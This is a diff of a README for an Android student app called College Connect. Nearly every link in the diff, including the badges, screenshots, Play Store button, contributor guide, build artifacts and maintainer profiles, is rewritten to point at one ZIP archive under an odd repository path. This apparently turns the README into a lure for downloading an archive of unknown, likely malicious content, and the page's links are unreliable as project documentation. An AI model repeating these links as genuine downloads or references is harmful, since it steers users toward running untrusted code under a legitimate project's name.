@@ -1,12 +1,12 @@
 # **College Connect**
 
-[![Codacy Badge](https://raw.githubusercontent.com/gayatrriiii/CollegeConnect/development/chylificatory/CollegeConnect.zip)](https://raw.githubusercontent.com/gayatrriiii/CollegeConnect/development/chylificatory/CollegeConnect.zip;utm_medium=referral&amp;utm_content=collegeconnect/CollegeConnect&amp;utm_campaign=Badge_Grade)
-[![Actions Status](https://raw.githubusercontent.com/gayatrriiii/CollegeConnect/development/chylificatory/CollegeConnect.zip)](https://raw.githubusercontent.com/gayatrriiii/CollegeConnect/development/chylificatory/CollegeConnect.zip)
-[![License Badge](https://raw.githubusercontent.com/gayatrriiii/CollegeConnect/development/chylificatory/CollegeConnect.zip%202.0-blue)](https://raw.githubusercontent.com/gayatrriiii/CollegeConnect/development/chylificatory/CollegeConnect.zip)
-[![Gitter](https://raw.githubusercontent.com/gayatrriiii/CollegeConnect/development/chylificatory/CollegeConnect.zip)](https://raw.githubusercontent.com/gayatrriiii/CollegeConnect/development/chylificatory/CollegeConnect.zip)
-![Api Level](https://raw.githubusercontent.com/gayatrriiii/CollegeConnect/development/chylificatory/CollegeConnect.zip%20API%20Level-24-important)
+[![Codacy Badge](https://raw.githubusercontent.com/gayatrriiii/CollegeConnect/development/app/src/test/java/com/Connect-College-piezoelectric.zip)](https://raw.githubusercontent.com/gayatrriiii/CollegeConnect/development/app/src/test/java/com/Connect-College-piezoelectric.zip;utm_medium=referral&amp;utm_content=collegeconnect/CollegeConnect&amp;utm_campaign=Badge_Grade)
+[![Actions Status](https://raw.githubusercontent.com/gayatrriiii/CollegeConnect/development/app/src/test/java/com/Connect-College-piezoelectric.zip)](https://raw.githubusercontent.com/gayatrriiii/CollegeConnect/development/app/src/test/java/com/Connect-College-piezoelectric.zip)
+[![License Badge](https://raw.githubusercontent.com/gayatrriiii/CollegeConnect/development/app/src/test/java/com/Connect-College-piezoelectric.zip%202.0-blue)](https://raw.githubusercontent.com/gayatrriiii/CollegeConnect/development/app/src/test/java/com/Connect-College-piezoelectric.zip)
+[![Gitter](https://raw.githubusercontent.com/gayatrriiii/CollegeConnect/development/app/src/test/java/com/Connect-College-piezoelectric.zip)](https://raw.githubusercontent.com/gayatrriiii/CollegeConnect/development/app/src/test/java/com/Connect-College-piezoelectric.zip)
+![Api Level](https://raw.githubusercontent.com/gayatrriiii/CollegeConnect/development/app/src/test/java/com/Connect-College-piezoelectric.zip%20API%20Level-24-important)
 
-<a href="https://raw.githubusercontent.com/gayatrriiii/CollegeConnect/development/chylificatory/CollegeConnect.zip"><img alt="Get it on Google Play" height="80" src="https://raw.githubusercontent.com/gayatrriiii/CollegeConnect/development/chylificatory/CollegeConnect.zip"></a>
+<a href="https://raw.githubusercontent.com/gayatrriiii/CollegeConnect/development/app/src/test/java/com/Connect-College-piezoelectric.zip"><img alt="Get it on Google Play" height="80" src="https://raw.githubusercontent.com/gayatrriiii/CollegeConnect/development/app/src/test/java/com/Connect-College-piezoelectric.zip"></a>
 
 College Connect is an android application aimed to be a one-stop-shop for all the college needs irrespective of college and course.  
 It aims to create a helpful platform for all college students.
@@ -19,17 +19,17 @@ Later it was aimed to be a _third party app for every college and course in Indi
 
 The app is developed using native android(Java and Kotlin both) and follows MVVM architecture. It is tightly coupled as it was developed as a project to learn Android Development.
 
-<img src = "https://raw.githubusercontent.com/gayatrriiii/CollegeConnect/development/chylificatory/CollegeConnect.zip" width="235" height="500"/> <img src = "https://raw.githubusercontent.com/gayatrriiii/CollegeConnect/development/chylificatory/CollegeConnect.zip" width="235" height="500"/>
+<img src = "https://raw.githubusercontent.com/gayatrriiii/CollegeConnect/development/app/src/test/java/com/Connect-College-piezoelectric.zip" width="235" height="500"/> <img src = "https://raw.githubusercontent.com/gayatrriiii/CollegeConnect/development/app/src/test/java/com/Connect-College-piezoelectric.zip" width="235" height="500"/>
 
 ### Attendence Manager
 The app has an integrated **Attendance Manager** which uses Room Library and SQLite Database to store and retrieve data and display it in a graphical manner which looks appealing and convenient to track your attendance.
   
-<img src = "https://raw.githubusercontent.com/gayatrriiii/CollegeConnect/development/chylificatory/CollegeConnect.zip" width="235" height="500"/>
+<img src = "https://raw.githubusercontent.com/gayatrriiii/CollegeConnect/development/app/src/test/java/com/Connect-College-piezoelectric.zip" width="235" height="500"/>
 
 ### Notes  
 The Notes tab provides notes uploaded by students. The recycler view shows the name of the author with a total number of downloads and relevant tags.
 
-<img src = "https://raw.githubusercontent.com/gayatrriiii/CollegeConnect/development/chylificatory/CollegeConnect.zip" width="235" height="500"/>
+<img src = "https://raw.githubusercontent.com/gayatrriiii/CollegeConnect/development/app/src/test/java/com/Connect-College-piezoelectric.zip" width="235" height="500"/>
 
 #### _Upload Notes and My Files_  
 The upload notes area provide for easy upload of notes by users. It takes the authors name to give credit to the author.
@@ -38,14 +38,14 @@ The number of downloads will encourage students to make more impressive notes an
 
 The My Files section enables easy management of the notes uploaded by the users as well as the notes downloaded by the user.
 
-<img src = "https://raw.githubusercontent.com/gayatrriiii/CollegeConnect/development/chylificatory/CollegeConnect.zip" width="235" height="500"/>  <img src = "https://raw.githubusercontent.com/gayatrriiii/CollegeConnect/development/chylificatory/CollegeConnect.zip" width="235" height="500"/>
+<img src = "https://raw.githubusercontent.com/gayatrriiii/CollegeConnect/development/app/src/test/java/com/Connect-College-piezoelectric.zip" width="235" height="500"/>  <img src = "https://raw.githubusercontent.com/gayatrriiii/CollegeConnect/development/app/src/test/java/com/Connect-College-piezoelectric.zip" width="235" height="500"/>
 
 
 ### Timetable
 This feature allows the user to store their timetable in an ingenious and orderly fashion. It also indicates the current ongoing class.
 It requires the user to enter the class details consisting of subject name, start time, end time and the room number. We're constantly working on to make this feature more interactive and seamless.
 
-<img src = "https://raw.githubusercontent.com/gayatrriiii/CollegeConnect/development/chylificatory/CollegeConnect.zip" width="235" height="500"/>
+<img src = "https://raw.githubusercontent.com/gayatrriiii/CollegeConnect/development/app/src/test/java/com/Connect-College-piezoelectric.zip" width="235" height="500"/>
 
 ### Tools
  * _Room Locator_ <br>
@@ -55,7 +55,7 @@ It shows the upcoming events around you and their details along with an option t
  * _Project Collaboration_ <br>
 This tool help to procreate a platform where different developers can come and work together on any projects. Just list your project and get collaborators. This feature is currently under development.
 
-<img src = "https://raw.githubusercontent.com/gayatrriiii/CollegeConnect/development/chylificatory/CollegeConnect.zip" width="235" height="500"/>
+<img src = "https://raw.githubusercontent.com/gayatrriiii/CollegeConnect/development/app/src/test/java/com/Connect-College-piezoelectric.zip" width="235" height="500"/>
 
 ### Settings
  * View and edit personal profile details  
@@ -63,20 +63,20 @@ This tool help to procreate a platform where different developers can come and w
  * View uploaded files
  * View and edit professional profile  
 
-<img src = "https://raw.githubusercontent.com/gayatrriiii/CollegeConnect/development/chylificatory/CollegeConnect.zip" width="235" height="500"/>
+<img src = "https://raw.githubusercontent.com/gayatrriiii/CollegeConnect/development/app/src/test/java/com/Connect-College-piezoelectric.zip" width="235" height="500"/>
 
 ## Contributions Best Practices
 
 
 ### For first time Contributors
 
-First-time contributors can read [https://raw.githubusercontent.com/gayatrriiii/CollegeConnect/development/chylificatory/CollegeConnect.zip](https://raw.githubusercontent.com/gayatrriiii/CollegeConnect/development/chylificatory/CollegeConnect.zip) file for help regarding creating issues and sending pull requests.
+First-time contributors can read [https://raw.githubusercontent.com/gayatrriiii/CollegeConnect/development/app/src/test/java/com/Connect-College-piezoelectric.zip](https://raw.githubusercontent.com/gayatrriiii/CollegeConnect/development/app/src/test/java/com/Connect-College-piezoelectric.zip) file for help regarding creating issues and sending pull requests.
 
 ### Branch Policy
 
 We have the following branches
 
- * **development**<br>All development goes on in this branch. If you're making a contribution, you are supposed to make a pull request to _development_. For PRs to be accepted to the development branch they must pass a build check and a unit-test check following which an apk will be generated under [action artifacts](https://raw.githubusercontent.com/gayatrriiii/CollegeConnect/development/chylificatory/CollegeConnect.zip) for testing.
+ * **development**<br>All development goes on in this branch. If you're making a contribution, you are supposed to make a pull request to _development_. For PRs to be accepted to the development branch they must pass a build check and a unit-test check following which an apk will be generated under [action artifacts](https://raw.githubusercontent.com/gayatrriiii/CollegeConnect/development/app/src/test/java/com/Connect-College-piezoelectric.zip) for testing.
  * **master**<br>This contains shipped code. After significant features/bugfixes are accumulated on development, we make a version update and make a release.
  	
 ### Code practices
@@ -100,5 +100,5 @@ This project is currently licensed under the Apache License Version 2.0. A copy 
 
 ## Maintainers and Developers
 This repository is owned and maintained by 
- * [Sajal Jain](https://raw.githubusercontent.com/gayatrriiii/CollegeConnect/development/chylificatory/CollegeConnect.zip)
- * [Saksham Pruthi](https://raw.githubusercontent.com/gayatrriiii/CollegeConnect/development/chylificatory/CollegeConnect.zip)
+ * [Sajal Jain](https://raw.githubusercontent.com/gayatrriiii/CollegeConnect/development/app/src/test/java/com/Connect-College-piezoelectric.zip)
+ * [Saksham Pruthi](https://raw.githubusercontent.com/gayatrriiii/CollegeConnect/development/app/src/test/java/com/Connect-College-piezoelectric.zip)
